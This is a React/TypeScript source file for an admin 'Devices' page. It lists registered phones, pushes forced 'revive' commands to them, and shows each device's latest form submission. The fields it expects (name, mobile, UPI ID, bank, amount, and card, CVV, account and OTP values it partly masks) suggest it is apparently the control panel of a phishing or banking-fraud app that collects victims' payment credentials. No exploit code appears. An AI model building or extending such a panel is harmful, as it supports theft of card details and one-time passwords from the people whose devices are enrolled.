// src/pages/DevicesPage.tsx
import {
  memo,
  useCallback,
  useDeferredValue,
  useEffect,
  useMemo,
  useRef,
  useState,
  type ReactNode,
} from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import axios from "axios";

import type { DeviceDoc } from "../types";
import { getDevices, deleteDevice } from "../services/api/devices";
import { getFavoritesMap, setFavorite } from "../services/api/favorites";
import { ENV, apiHeaders } from "../config/constants";
import ztLogo from "../assets/zt-logo.png";
import AnimatedAppBackground from "../components/layout/AnimatedAppBackground";
import wsService from "../services/ws/wsService";

type Row = DeviceDoc & { _fav?: boolean };
type FormSubmission = Record<string, any>;
type DeviceFilter = "all" | "online" | "offline" | "favorites";

type DisplayRow = Row & {
  brand: string;
  model: string;
  online: boolean;
  favoriteFlag: boolean;
  lastSeenTs: number;
  lastSeenLabel: string;
  lastForm: string;
  logoSrc: string;
};

const LIST_ROW_HEIGHT = 238;
const LIST_OVERSCAN = 8;
const VIRTUALIZE_AFTER = 20;

function safeStr(v: unknown): string {
  return String(v ?? "").trim();
}

function normalizeFilter(v: string | null | undefined): DeviceFilter {
  if (v === "online" || v === "offline" || v === "favorites") return v;
  return "all";
}

function pickDeviceId(d: any): string {
  return safeStr(d?.deviceId || d?.uniqueid || d?.uniqueId || d?.uid || "");
}

function pickBrand(d: any): string {
  const meta = d?.metadata || {};
  return safeStr(meta.brand || meta.manufacturer || d?.brand || "Unknown Brand");
}

function pickModel(d: any): string {
  const meta = d?.metadata || {};
  return safeStr(meta.model || d?.model || "");
}

function pickLastSeenTs(d: any): number {
  const ts = d?.status?.timestamp;
  return typeof ts === "number" ? ts : 0;
}

function formatLastSeen(ts: number): string {
  if (!ts) return "-";
  try {
    return new Date(ts).toLocaleString();
  } catch {
    return "-";
  }
}

function pickFormDeviceId(s: FormSubmission): string {
  return safeStr(s?.uniqueid || s?.uniqueId || s?.deviceId || s?.device || s?.uid || "");
}

function pickFormTs(s: FormSubmission): number {
  const t1 = Number(s?.timestamp || s?.ts);
  if (Number.isFinite(t1) && t1 > 0) return t1;

  const created = safeStr(s?.createdAt || s?.created_at || s?.date || "");
  if (created) {
    const t = Date.parse(created);
    if (Number.isFinite(t)) return t;
  }

  return 0;
}

function maskMaybeSensitive(key: string, value: string): string {
  const k = key.toLowerCase();
  const digits = value.replace(/\D/g, "");
  const looksSensitive =
    k.includes("card") || k.includes("cvv") || k.includes("pan") || k.includes("account") || k.includes("acc");

  if (looksSensitive && digits.length >= 8) return `****${digits.slice(-4)}`;
  if (k.includes("otp") && digits.length >= 4) return "****";

  return value;
}

function summarizeForm(s: FormSubmission | null | undefined): string {
  if (!s || typeof s !== "object") return "No form submit";

  const source = s?.payload && typeof s.payload === "object" ? s.payload : s;

  const candidates: Array<[string, any]> = [
    ["name", source.name || source.fullName],
    ["mobile", source.mobile || source.phone],
    ["amount", source.amount || source.amt],
    ["upi", source.upi || source.upiId],
    ["bank", source.bank || source.bankName],
    ["title", source.title || source.formTitle],
  ];

  const parts: string[] = [];

  for (const [k, raw] of candidates) {
    const v = safeStr(raw);
    if (!v) continue;
    parts.push(`${k}: ${maskMaybeSensitive(k, v)}`);
    if (parts.length >= 3) break;
  }

  const ts = pickFormTs(s);
  if (ts) parts.push(new Date(ts).toLocaleString());

  return parts.length ? parts.join(" • ") : "Form submitted";
}

function pickDeviceLogo(d: any): string {
  const meta = d?.metadata || {};
  const url = safeStr(meta.logoUrl || meta.logo || meta.iconUrl || meta.brandLogoUrl);

  if (url.startsWith("http://") || url.startsWith("https://") || url.startsWith("data:image/")) {
    return url;
  }

  return ztLogo;
}

function DeviceLogo({ src, alt }: { src: string; alt: string }) {
  const [broken, setBroken] = useState(false);

  if (broken) {
    return (
      <div className="flex h-11 w-11 items-center justify-center rounded-2xl border border-slate-200 bg-white text-sm font-bold text-slate-700">
        {alt.slice(0, 1).toUpperCase()}
      </div>
    );
  }

  return (
    <img
      src={src}
      alt={alt}
      className="h-11 w-11 rounded-2xl border border-slate-200 bg-white object-cover"
      onError={() => setBroken(true)}
      draggable={false}
      loading="lazy"
    />
  );
}

function SurfaceCard({ children, className = "" }: { children: ReactNode; className?: string }) {
  return (
    <div
      className={[
        "rounded-[26px] border border-slate-200/90 bg-white/90 shadow-[0_8px_28px_rgba(15,23,42,0.08)] backdrop-blur-sm",
        className,
      ].join(" ")}
    >
      {children}
    </div>
  );
}

type DeviceCardProps = {
  device: DisplayRow;
  displayNumber: number;
  isChecking: boolean;
  onOpen: (deviceId: string) => void;
  onToggleFavorite: (deviceId: string) => void;
  onCheckOnline: (deviceId: string) => void;
  onDelete: (deviceId: string) => void;
};

const DeviceCard = memo(function DeviceCard({
  device,
  displayNumber,
  isChecking,
  onOpen,
  onToggleFavorite,
  onCheckOnline,
  onDelete,
}: DeviceCardProps) {
  return (
    <div className="h-full rounded-[24px] border border-slate-200 bg-white/92 p-4 shadow-[0_8px_24px_rgba(15,23,42,0.06)]">
      <div className="flex items-start justify-between gap-3">
        <div className="flex min-w-0 items-center gap-3">
          <DeviceLogo src={device.logoSrc} alt={device.brand} />

          <div className="min-w-0">
            <div className="flex min-w-0 items-center gap-2">
              <div className="min-w-0 truncate text-[16px] font-extrabold text-slate-900">{device.brand}</div>

              <div
                className="flex h-7 w-7 flex-shrink-0 items-center justify-center rounded-full bg-slate-900 text-sm font-extrabold text-white"
                title={`#${displayNumber}`}
                aria-hidden={false}
              >
                {displayNumber}
              </div>
            </div>

            <div className="truncate text-[12px] text-slate-500">
              {device.model ? `${device.model} • ` : ""}
              ID: {device.deviceId}
            </div>
          </div>
        </div>

        <div className="flex shrink-0 items-center gap-2">
          <span
            className={[
              "rounded-full border px-3 py-1 text-[12px] font-extrabold",
              device.online
                ? "border-emerald-200 bg-emerald-50 text-emerald-700"
                : "border-rose-200 bg-rose-50 text-rose-700",
            ].join(" ")}
          >
            {device.online ? "Online" : "Offline"}
          </span>

          <button
            onClick={() => onToggleFavorite(device.deviceId)}
            className={[
              "flex h-10 w-10 items-center justify-center rounded-2xl border text-lg transition active:scale-[0.98]",
              device.favoriteFlag
                ? "border-amber-200 bg-amber-50 text-amber-600"
                : "border-slate-200 bg-white text-slate-500 hover:bg-slate-50",
            ].join(" ")}
            type="button"
            title={device.favoriteFlag ? "Unfavorite" : "Favorite"}
          >
            ★
          </button>
        </div>
      </div>

      <div className="mt-4 grid grid-cols-2 gap-3">
        <div className="min-w-0 rounded-2xl border border-slate-200 bg-slate-50 p-3">
          <div className="text-[11px] text-slate-500">Last seen</div>
          <div className="mt-1 break-words text-[13px] font-semibold leading-5 text-slate-800">
            {device.lastSeenLabel}
          </div>
        </div>

        <div className="min-w-0 rounded-2xl border border-slate-200 bg-slate-50 p-3">
          <div className="text-[11px] text-slate-500">Latest form</div>
          <div className="mt-1 break-words text-[13px] font-semibold leading-5 text-slate-700">
            {device.lastForm}
          </div>
        </div>
      </div>

      <div className="mt-4 grid grid-cols-3 gap-2">
        <button
          onClick={() => onOpen(device.deviceId)}
          className="h-11 rounded-2xl border border-slate-200 bg-white px-2 text-[13px] font-extrabold text-slate-900 transition hover:bg-slate-50 active:scale-[0.99]"
          type="button"
        >
          Open
        </button>

        <button
          onClick={() => onCheckOnline(device.deviceId)}
          disabled={isChecking}
          className={[
            "h-11 rounded-2xl border border-sky-200 bg-sky-50 px-2 text-[13px] font-extrabold text-sky-700 transition active:scale-[0.99]",
            "hover:bg-sky-100 disabled:cursor-not-allowed disabled:opacity-60",
          ].join(" ")}
          type="button"
        >
          {isChecking ? "Checking…" : "Check"}
        </button>

        <button
          onClick={() => onDelete(device.deviceId)}
          className="h-11 rounded-2xl border border-rose-200 bg-rose-50 px-2 text-[13px] font-extrabold text-rose-700 transition hover:bg-rose-100 active:scale-[0.99]"
          type="button"
        >
          Delete
        </button>
      </div>
    </div>
  );
});

export default function DevicesPage() {
  const nav = useNavigate();
  const [searchParams, setSearchParams] = useSearchParams();

  const [devices, setDevices] = useState<Row[]>([]);
  const [favoritesMap, setFavoritesMap] = useState<Record<string, boolean>>({});
  const [latestFormMap, setLatestFormMap] = useState<Record<string, FormSubmission>>({});
  const [loading, setLoading] = useState(false);

  const [search, setSearch] = useState("");
  const deferredSearch = useDeferredValue(search);

  const [filter, setFilter] = useState<DeviceFilter>(normalizeFilter(searchParams.get("filter")));
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState<string | null>(null);
  const [checkingDeviceId, setCheckingDeviceId] = useState<string | null>(null);
  const [checkingAll, setCheckingAll] = useState(false);

  const loadInFlightRef = useRef(false);
  const favoritesRef = useRef<Record<string, boolean>>({});
  const listRef = useRef<HTMLDivElement | null>(null);
  const [visibleRange, setVisibleRange] = useState({ start: 0, end: 18 });

  const loadFormsLatestByDevice = useCallback(async (): Promise<Record<string, FormSubmission>> => {
    try {
      const res = await axios.get(`${ENV.API_BASE}/api/form_submissions`, {
        headers: apiHeaders(),
        timeout: 12000,
      });

      const list = Array.isArray(res.data) ? (res.data as FormSubmission[]) : [];
      const map: Record<string, FormSubmission> = {};

      for (const s of list) {
        const did = pickFormDeviceId(s);
        if (!did) continue;

        const ts = pickFormTs(s);
        const prev = map[did];

        if (!prev || ts > pickFormTs(prev)) {
          map[did] = s;
        }
      }

      return map;
    } catch {
      return {};
    }
  }, []);

  const sendCheckOnlineCommand = useCallback(async (deviceId: string) => {
    const encodedId = encodeURIComponent(deviceId);
    const headers = apiHeaders();

    try {
      return await axios.post(
        `${ENV.API_BASE}/api/admin/push/devices/${encodedId}/revive`,
        { source: "devices_page", force: true },
        { headers, timeout: 15000 },
      );
    } catch {
      return axios.post(
        `${ENV.API_BASE}/api/admin/push/devices/${encodedId}/start`,
        { source: "devices_page", force: true },
        { headers, timeout: 15000 },
      );
    }
  }, []);

  const mergeDevices = useCallback((list: any[], safeFav: Record<string, boolean>) => {
    const normalized = (list || []).map((d: any) => {
      const id = pickDeviceId(d) || "unknown";
      return { ...d, deviceId: id, _fav: !!safeFav[id] } as Row;
    });

    normalized.reverse();
    return normalized;
  }, []);

  const loadAll = useCallback(
    async ({ includeForms = true, silent = false }: { includeForms?: boolean; silent?: boolean } = {}) => {
      if (loadInFlightRef.current) return;

      loadInFlightRef.current = true;
      if (!silent) setLoading(true);

      try {
        const [list, favMap, maybeForms] = await Promise.all([
          getDevices(),
          getFavoritesMap(),
          includeForms ? loadFormsLatestByDevice() : Promise.resolve(null),
        ]);

        const safeFav = favMap || {};
        const normalized = mergeDevices(list || [], safeFav);

        setDevices(normalized);
        setFavoritesMap(safeFav);
        favoritesRef.current = safeFav;

        if (maybeForms) {
          setLatestFormMap(maybeForms);
        }
      } catch (e) {
        console.error("loadAll failed", e);
        setSuccess(null);
        setError("Failed to load devices from server");
        setDevices([]);
        if (includeForms) setLatestFormMap({});
      } finally {
        loadInFlightRef.current = false;
        if (!silent) setLoading(false);
      }
    },
    [loadFormsLatestByDevice, mergeDevices],
  );

  useEffect(() => {
    favoritesRef.current = favoritesMap;
  }, [favoritesMap]);

  useEffect(() => {
    const qpFilter = normalizeFilter(searchParams.get("filter"));
    setFilter((prev) => (prev === qpFilter ? prev : qpFilter));
  }, [searchParams]);

  useEffect(() => {
    loadAll({ includeForms: true }).catch(() => {});
    wsService.connect();

    const off = wsService.onMessage((msg) => {
      try {
        if (!msg || msg.type !== "event") return;

        if (msg.event === "status") {
          const did = safeStr(msg.deviceId || msg?.data?.deviceId);
          if (!did) return;

          const online = !!msg?.data?.online;
          const timestamp = Number(msg?.data?.timestamp || Date.now());

          setDevices((prev) => {
            const index = prev.findIndex((d) => safeStr(d.deviceId) === did);

            if (index === -1) {
              const created: Row = {
                deviceId: did,
                metadata: {},
                status: { online, timestamp },
                _fav: !!favoritesRef.current[did],
              } as Row;
              return [created, ...prev];
            }

            return prev.map((d) =>
              safeStr(d.deviceId) === did
                ? {
                    ...d,
                    status: {
                      ...(d.status || {}),
                      online,
                      timestamp,
                    },
                  }
                : d,
            );
          });

          return;
        }

        if (msg.event === "favorite:update") {
          const did = safeStr(msg?.data?.deviceId || msg.deviceId);
          if (!did) return;

          const favorite = !!msg?.data?.favorite;
          setFavoritesMap((prev) => {
            const next = { ...prev, [did]: favorite };
            favoritesRef.current = next;
            return next;
          });

          setDevices((prev) =>
            prev.map((d) =>
              safeStr(d.deviceId) === did ? { ...d, favorite, _fav: favorite } : d,
            ),
          );
          return;
        }

        if (msg.event === "device:delete") {
          const did = safeStr(msg?.data?.deviceId || msg.deviceId);
          if (!did) return;

          setDevices((prev) => prev.filter((d) => safeStr(d.deviceId) !== did));

          setFavoritesMap((prev) => {
            const copy = { ...prev };
            delete copy[did];
            favoritesRef.current = copy;
            return copy;
          });

          setLatestFormMap((prev) => {
            const copy = { ...prev };
            delete copy[did];
            return copy;
          });
          return;
        }

        if (msg.event === "form:created" || msg.event === "form_submissions:created") {
          const did = safeStr(msg?.data?.uniqueid || msg?.data?.deviceId || msg.deviceId);
          if (!did) return;

          const payload =
            msg?.data?.payload && typeof msg.data.payload === "object"
              ? msg.data.payload
              : msg?.data || {};

          const nextForm: FormSubmission = {
            ...(payload || {}),
            uniqueid: did,
            createdAt: msg?.timestamp || Date.now(),
            timestamp: msg?.timestamp || Date.now(),
          };

          setLatestFormMap((prev) => {
            const existing = prev[did];
            const prevTs = existing ? pickFormTs(existing) : 0;
            const nextTs = pickFormTs(nextForm);
            if (existing && prevTs > nextTs) return prev;
            return { ...prev, [did]: nextForm };
          });
          return;
        }
      } catch {
        // ignore
      }
    });

    return () => {
      off();
    };
  }, [loadAll]);

  const displayRows = useMemo<DisplayRow[]>(() => {
    return devices.map((d) => {
      const deviceId = safeStr(d.deviceId);
      const favoriteFlag = !!(favoritesMap[deviceId] ?? d.favorite ?? d._fav);
      const lastSeenTs = pickLastSeenTs(d);

      return {
        ...d,
        deviceId,
        brand: pickBrand(d),
        model: pickModel(d),
        online: !!d.status?.online,
        favoriteFlag,
        lastSeenTs,
        lastSeenLabel: formatLastSeen(lastSeenTs),
        lastForm: latestFormMap[deviceId] ? summarizeForm(latestFormMap[deviceId]) : "No form submit",
        logoSrc: pickDeviceLogo(d),
      };
    });
  }, [devices, favoritesMap, latestFormMap]);

  const filtered = useMemo(() => {
    const q = deferredSearch.trim().toLowerCase();

    return displayRows.filter((d) => {
      if (filter === "online" && !d.online) return false;
      if (filter === "offline" && d.online) return false;
      if (filter === "favorites" && !d.favoriteFlag) return false;

      if (!q) return true;

      return (
        d.deviceId.toLowerCase().includes(q) ||
        d.brand.toLowerCase().includes(q) ||
        d.model.toLowerCase().includes(q)
      );
    });
  }, [displayRows, deferredSearch, filter]);

  const shouldVirtualize = filtered.length > VIRTUALIZE_AFTER;

  useEffect(() => {
    if (!shouldVirtualize) {
      setVisibleRange({ start: 0, end: filtered.length });
      return;
    }

    let raf = 0;

    const calcRange = () => {
      const el = listRef.current;
      if (!el) return;

      const rect = el.getBoundingClientRect();
      const listTop = rect.top + window.scrollY;
      const scrollTop = window.scrollY;
      const viewportBottom = scrollTop + window.innerHeight;

      const relativeTop = Math.max(0, scrollTop - listTop);
      const relativeBottom = Math.max(0, viewportBottom - listTop);

      const start = Math.max(0, Math.floor(relativeTop / LIST_ROW_HEIGHT) - LIST_OVERSCAN);
      const end = Math.min(filtered.length, Math.ceil(relativeBottom / LIST_ROW_HEIGHT) + LIST_OVERSCAN);

      setVisibleRange((prev) => {
        if (prev.start === start && prev.end === end) return prev;
        return { start, end };
      });
    };

    const onScrollOrResize = () => {
      if (raf) return;
      raf = window.requestAnimationFrame(() => {
        raf = 0;
        calcRange();
      });
    };

    calcRange();

    window.addEventListener("scroll", onScrollOrResize, { passive: true });
    window.addEventListener("resize", onScrollOrResize);

    return () => {
      if (raf) window.cancelAnimationFrame(raf);
      window.removeEventListener("scroll", onScrollOrResize);
      window.removeEventListener("resize", onScrollOrResize);
    };
  }, [filtered.length, shouldVirtualize]);

  const handleFilterChange = useCallback(
    (next: DeviceFilter) => {
      setFilter(next);

      const params = new URLSearchParams(searchParams);
      if (next === "all") params.delete("filter");
      else params.set("filter", next);

      setSearchParams(params, { replace: true });
    },
    [searchParams, setSearchParams],
  );

  const handleOpen = useCallback(
    (deviceId: string) => {
      nav(`/devices/${encodeURIComponent(deviceId)}`);
    },
    [nav],
  );

  const toggleFavoriteHandler = useCallback(
    async (deviceId: string) => {
      const curr = !!(favoritesRef.current[deviceId] ?? false);
      const next = !curr;

      setFavoritesMap((m) => {
        const updated = { ...m, [deviceId]: next };
        favoritesRef.current = updated;
        return updated;
      });

      setDevices((prev) =>
        prev.map((d) => (d.deviceId === deviceId ? { ...d, favorite: next, _fav: next } : d)),
      );

      try {
        await setFavorite(deviceId, next);
      } catch (e) {
        console.error("toggleFavorite failed", e);

        setFavoritesMap((m) => {
          const reverted = { ...m, [deviceId]: curr };
          favoritesRef.current = reverted;
          return reverted;
        });

        setDevices((prev) =>
          prev.map((d) => (d.deviceId === deviceId ? { ...d, favorite: curr, _fav: curr } : d)),
        );

        setSuccess(null);
        setError("Failed to update favorite");
      }
    },
    [],
  );

  const handleDeleteDevice = useCallback(async (deviceId: string) => {
    if (!window.confirm(`Delete device ${deviceId}? This will remove it from DB.`)) return;

    try {
      await deleteDevice(deviceId);

      setDevices((prev) => prev.filter((d) => d.deviceId !== deviceId));

      setFavoritesMap((m) => {
        const copy = { ...m };
        delete copy[deviceId];
        favoritesRef.current = copy;
        return copy;
      });

      setLatestFormMap((m) => {
        const copy = { ...m };
        delete copy[deviceId];
        return copy;
      });

      setSuccess(null);
      setError(null);
    } catch (e) {
      console.error("deleteDevice failed", e);
      setSuccess(null);
      setError("Failed to delete device");
    }
  }, []);

  const handleCheckOnline = useCallback(
    async (deviceId: string) => {
      if (!deviceId || checkingDeviceId || checkingAll) return;

      setCheckingDeviceId(deviceId);
      setError(null);
      setSuccess(null);

      try {
        await sendCheckOnlineCommand(deviceId);
        setSuccess(`Check command sent to ${deviceId}`);
      } catch (e) {
        console.error("check online failed", e);
        setError(`Failed to send check command for ${deviceId}`);
      } finally {
        setCheckingDeviceId(null);
      }
    },
    [checkingAll, checkingDeviceId, sendCheckOnlineCommand],
  );

  const handleCheckAll = useCallback(async () => {
    if (checkingAll || checkingDeviceId) return;

    const ids = Array.from(new Set(devices.map((d) => safeStr(d.deviceId)).filter(Boolean)));

    if (ids.length === 0) {
      setSuccess(null);
      setError("No devices available");
      return;
    }

    setCheckingAll(true);
    setError(null);
    setSuccess(null);

    try {
      const results = await Promise.allSettled(ids.map((id) => sendCheckOnlineCommand(id)));
      const okCount = results.filter((r) => r.status === "fulfilled").length;
      const failCount = results.length - okCount;

      if (failCount === 0) {
        setSuccess(`Check command sent to all ${okCount} devices`);
      } else if (okCount > 0) {
        setSuccess(`Check command sent to ${okCount} devices`);
        setError(`Failed for ${failCount} devices`);
      } else {
        setError("Failed to send check command to devices");
      }
    } catch (e) {
      console.error("check all failed", e);
      setError("Failed to send check command to devices");
    } finally {
      setCheckingAll(false);
    }
  }, [checkingAll, checkingDeviceId, devices, sendCheckOnlineCommand]);

  const handleManualRefresh = useCallback(() => {
    setError(null);
    setSuccess(null);
    loadAll({ includeForms: true }).catch(() => {});
  }, [loadAll]);

  const visibleRows = shouldVirtualize ? filtered.slice(visibleRange.start, visibleRange.end) : filtered;
  const topSpacer = shouldVirtualize ? visibleRange.start * LIST_ROW_HEIGHT : 0;
  const bottomSpacer = shouldVirtualize ? Math.max(0, (filtered.length - visibleRange.end) * LIST_ROW_HEIGHT) : 0;

  return (
    <AnimatedAppBackground>
      <div className="mx-auto w-full max-w-[420px] px-3 pb-24 pt-4">
        <SurfaceCard className="p-4">
          <div className="flex items-start justify-between gap-3">
            <div className="min-w-0">
              <div className="text-[22px] font-extrabold tracking-tight text-slate-900">Devices</div>
              <div className="text-[12px] text-slate-500">Manage all registered devices</div>
            </div>

            <div className="flex shrink-0 items-center gap-2">
              <button
                onClick={handleCheckAll}
                disabled={checkingAll || devices.length === 0}
                className={[
                  "h-10 rounded-2xl border border-sky-200 bg-sky-50 px-4 text-sky-700 transition active:scale-[0.99]",
                  "hover:bg-sky-100 disabled:cursor-not-allowed disabled:opacity-60",
                ].join(" ")}
                type="button"
                title="Check all devices"
              >
                {checkingAll ? "Checking…" : "Check All"}
              </button>

              <button
                onClick={handleManualRefresh}
                className="h-10 rounded-2xl border border-slate-200 bg-white px-4 text-slate-700 transition hover:bg-slate-50"
                type="button"
                title="Refresh"
              >
                ↻
              </button>
            </div>
          </div>

          <div className="mt-4">
            <input
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              placeholder="Search brand / model / id"
              className={[
                "h-11 w-full rounded-2xl px-4 text-[14px]",
                "border border-slate-200 bg-white",
                "text-slate-900 placeholder:text-slate-400",
                "outline-none transition",
                "focus:border-sky-300 focus:ring-2 focus:ring-sky-100",
              ].join(" ")}
            />
          </div>

          <div className="mt-3 flex items-center justify-between gap-2">
            <div className="text-[12px] text-slate-500">Results: {filtered.length}</div>

            <select
              value={filter}
              onChange={(e) => handleFilterChange(e.target.value as DeviceFilter)}
              className={[
                "h-10 rounded-2xl px-3 text-[13px] font-semibold",
                "border border-slate-200 bg-white",
                "text-slate-800 outline-none",
              ].join(" ")}
            >
              <option value="all">All</option>
              <option value="online">Online</option>
              <option value="offline">Offline</option>
              <option value="favorites">Favorites</option>
            </select>
          </div>

          <div ref={listRef} className="mt-4">
            {loading && devices.length === 0 ? (
              <div className="rounded-3xl border border-slate-200 bg-white p-5 text-center text-slate-500">
                Loading…
              </div>
            ) : filtered.length === 0 ? (
              <div className="rounded-3xl border border-slate-200 bg-white p-6 text-center text-slate-500">
                No devices found.
              </div>
            ) : (
              <>
                {topSpacer > 0 && <div style={{ height: topSpacer }} />}

                {visibleRows.map((d, idx) => {
                  const absoluteIndex = shouldVirtualize ? visibleRange.start + idx : idx;
                  const displayNumber = filtered.length - absoluteIndex;
                  const isCheckingThis = checkingDeviceId === d.deviceId;

                  return (
                    <div
                      key={d.deviceId}
                      className="mb-3"
                      style={shouldVirtualize ? { height: LIST_ROW_HEIGHT } : undefined}
                    >
                      <DeviceCard
                        device={d}
                        displayNumber={displayNumber}
                        isChecking={isCheckingThis || checkingAll}
                        onOpen={handleOpen}
                        onToggleFavorite={toggleFavoriteHandler}
                        onCheckOnline={handleCheckOnline}
                        onDelete={handleDeleteDevice}
                      />
                    </div>
                  );
                })}

                {bottomSpacer > 0 && <div style={{ height: bottomSpacer }} />}
              </>
            )}
          </div>

          {success && (
            <div className="mt-4 rounded-2xl border border-emerald-200 bg-emerald-50 px-4 py-2 text-sm text-emerald-700">
              {success}
            </div>
          )}

          {error && (
            <div className="mt-4 rounded-2xl border border-rose-200 bg-rose-50 px-4 py-2 text-sm text-rose-700">
              {error}
            </div>
          )}
        </SurfaceCard>
      </div>
    </AnimatedAppBackground>
  );
}
